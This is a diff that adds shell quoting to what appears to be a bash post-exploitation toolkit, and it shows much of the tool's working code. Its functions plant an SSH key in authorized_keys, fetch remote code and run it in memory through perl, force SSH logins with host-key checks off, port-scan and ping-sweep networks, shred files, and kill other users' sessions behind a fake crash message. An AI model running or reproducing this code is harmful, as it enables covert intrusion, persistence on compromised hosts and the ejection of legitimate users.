@@ -144,7 +144,7 @@ getinfo() {
   echo "Gathering useful command output."
   echo "Find it in $HOME/f.tar.xz"
   OUTP=$HOME/files/
-  mkdir --mode 700 $OUTP
+  mkdir --mode 700 "$OUTP"
   log2outp passwd getent passwd
   log2outp uname uname -a
   log2outp ps ps -weFH
@@ -191,17 +191,17 @@ getinfo() {
     fi
   fi
   # Stores all log files in one compressed tar archive.
-  tar -cJf $HOME/f.tar.xz $OUTP
+  tar -cJf "$HOME/f.tar.xz" "$OUTP"
   if [ $? -gt 0 ]; then
     # maybe the tar internal xz fail. Try an external xz compression.
-    tar -cf - $OUTP | xz -c -9 > $HOME/f.tar.xz
+    tar -cf - "$OUTP" | xz -c -9 > "$HOME/f.tar.xz"
   fi
   if [ $? -gt 0 ]; then
     # maybe xz command failed. Try the old gzip inside tar
-    tar -czf $HOME/f.tar.gz $OUTP
+    tar -czf "$HOME/f.tar.gz" "$OUTP"
   fi
   # Remove the single log files. Keep only the archive file.
-  rm -rf $OUTP
+  rm -rf "$OUTP"
 }
 
 timedshell() { 
@@ -247,7 +247,7 @@ ourpts() {
   mypts=${mytty#/dev/pts/}
   # Check if it is a pts device
   if [ "/dev/pts/$mypts" = "$mytty" ]; then
-    echo $mypts
+    echo "$mypts"
   fi
 }
 
@@ -257,7 +257,7 @@ getidle() {
   # Globals   : our_pty could contain the number of our PTY
   export our_pty=$(ourpts)
   stat /dev/pts/* -c '%n %X %U' |
-  awk -v now=$(date +%s) '$1 ~ /\/[0-9]+$/ {
+  awk -v now="$(date +%s)" '$1 ~ /\/[0-9]+$/ {
       gsub( /[^0-9]/, "", $1 )
       list[$1]="PTY " $1 " is " now-$2 " seconds idle and owned by " $3
       if( $1==ENVIRON["our_pty"] ) list[$1]=list[$1] " ** this is us **"}
@@ -266,7 +266,7 @@ getidle() {
 }
 
 srm() {
-shred -vzfun 2 $1
+shred -vzfun 2 "$1"
 }
 
 qssh() {
@@ -275,7 +275,7 @@ if tty | grep -q "not"; then
 	echo "echo $1" >> /dev/shm/.q/.k
 	chmod a+x /dev/shm/.q/.k
 	shift
-	DISPLAY="" SSH_ASKPASS="/dev/shm/.q/.k" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T $@
+	DISPLAY="" SSH_ASKPASS="/dev/shm/.q/.k" ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -T "$@"
 else
 	echo "You've got a tty. You can't use qssh."
 fi
@@ -292,9 +292,9 @@ rm /dev/shm/.q/.c
 
 memexec() {
 memfile=$(orc_loadURL "$1" | od --endian=big -An -x | tr -d ' ' | tr -d '\n')
-finalmem=$(echo $memfda | base64 -d)
+finalmem=$(echo "$memfda" | base64 -d)
 finalmem=${finalmem}$(echo -ne "$memfile/ or die;\n")
-finalmem=${finalmem}$(echo $memfdb | base64 -d)
+finalmem=${finalmem}$(echo "$memfdb" | base64 -d)
 echo "$finalmem" | perl
 }
 
@@ -318,11 +318,11 @@ keyinstall() {
 touch /dev/shm/.q/.ssh
 touch -r /
 sshkey="ssh-rsa [YOUR KEY HERE] $(whoami)@$(hostname)"
-echo $sshkey >> $NHOME/.ssh/authorized_keys
+echo "$sshkey" >> "$NHOME/.ssh/authorized_keys"
 }
 
 psgrep() {
-ps -weFH | grep $1 | grep -v grep
+ps -weFH | grep "$1" | grep -v grep
 }
 
 getescape() {
@@ -361,7 +361,7 @@ echo "Checking to see if we're in one giant simulation..."
 portscan() {
 porta="21 22 23 80 443 8080 8443 129 445 3389 3306"
 echo "Starting portscan..."
-echo $porta | tr ' ' '\n' | while read i;do
+echo "$porta" | tr ' ' '\n' | while read i;do
 bash -c "echo '' > /dev/tcp/$1/$i" 2>/dev/null
 	if echo $? | grep -q 0; then
 	echo "Host $1 port $i open"
@@ -370,7 +370,7 @@ done
 }
 
 fpssh() {
-ssh-keyscan $1
+ssh-keyscan "$1"
 }
 
 getip() {
@@ -408,16 +408,16 @@ sorry(){
 	echo "Pinging IPs in the background..."
 		if hash ifconfig 2>/dev/null; then
 		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-		echo $valid | tr ' ' '\n' | while read i;do
-			 if ping -c1 -q $i | grep -q "\ 0%"; then
-			 echo $i is alive >> /dev/shm/.q/ips
+		echo "$valid" | tr ' ' '\n' | while read i;do
+			 if ping -c1 -q "$i" | grep -q "\ 0%"; then
+			 echo "$i is alive" >> /dev/shm/.q/ips
 			fi
 		done
 	else 
 	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr $(ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}') | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
-	echo $valid | tr ' ' '\n' | while read i;do
-		 if ping -c1 -q $i | grep -q "\ 0%"; then
-		 echo $i is alive >> /dev/shm/.q/ips
+	echo "$valid" | tr ' ' '\n' | while read i;do
+		 if ping -c1 -q "$i" | grep -q "\ 0%"; then
+		 echo "$i is alive" >> /dev/shm/.q/ips
 		fi
 	done
 	fi
@@ -425,17 +425,17 @@ sorry(){
 		if hash ifconfig 2>/dev/null; then
 		if ifconfig | grep -q "255.255.255.0"; then 
 		INPUT=$(seq -f $(ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
-		echo $INPUT | tr ' ' '\n' | while read i;do
-			if ping -c1 -q $i | grep -q "\ 0%"; then
-			echo $i is alive >> /dev/shm/.q/ips
+		echo "$INPUT" | tr ' ' '\n' | while read i;do
+			if ping -c1 -q "$i" | grep -q "\ 0%"; then
+			echo "$i" is alive >> /dev/shm/.q/ips
 			fi
 		done
 		else 
 			if ip addr show | grep -E '/24*.brd'; then
 			INPUT=$(seq -f $(ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 254"}'))
-			echo $INPUT | tr ' ' '\n' | while read i;do
-				 if ping -c1 -q $i | grep -q "\ 0%"; then
-				 echo $i is alive >> /dev/shm/.q/ips
+			echo "$INPUT" | tr ' ' '\n' | while read i;do
+				 if ping -c1 -q "$i" | grep -q "\ 0%"; then
+				 echo "$i is alive" >> /dev/shm/.q/ips
 				fi
 			done
 			fi
@@ -510,7 +510,7 @@ hangup() {
   for PTS_ID in $PTS_LIST; do
     PTS_NAME="pts/$PTS_ID"
     echo "Terminating $PTS_NAME"
-    OWNER=$(stat -c '%U' /dev/$PTS_NAME)
+    OWNER=$(stat -c '%U' "/dev/$PTS_NAME")
     if [ "$OWNER" = "" ]; then
       echo "Something is wrong: can't get the owner of $PTS_NAME"
       continue
@@ -522,9 +522,9 @@ hangup() {
       continue
     fi
     echo "SSHD PID is $SSHD_PID"
-    echo 'Segmentation Fault.' > /dev/$PTS_NAME
+    echo 'Segmentation Fault.' > "/dev/$PTS_NAME"
     sleep 2
-    kill -9 $SSHD_PID
+    kill -9 "$SSHD_PID"
   done
 }
 
@@ -628,5 +628,5 @@ echo "Run gethelp to see a list of commands."
 echo "/dev/shm/.q should be deleted upon exit."
 PS1='$USER'"@$(hostname):"'$PWD'"$ " 
 HOME="/dev/shm/.q"
-NHOME=$(getent passwd | grep --color=never $(id -u) | cut -d: -f 6)
+NHOME=$(getent passwd | grep --color=never "$(id -u)" | cut -d: -f 6)
 #rm $ENV
